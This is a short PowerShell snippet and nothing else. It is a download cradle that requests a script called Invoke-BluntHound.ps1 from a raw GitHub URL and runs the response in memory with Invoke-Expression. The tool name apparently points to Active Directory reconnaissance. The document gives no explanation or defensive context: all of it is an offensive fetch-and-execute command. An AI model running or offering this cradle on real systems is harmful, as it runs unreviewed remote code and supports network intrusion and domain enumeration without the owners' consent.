$wr = [System.NET.WebRequest]::Create("https://raw.githubusercontent.com/RFC1918-hub/RFCRandom/main/Invoke-BluntHound.ps1")
$r = $wr.GetResponse()
Invoke-Expression ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()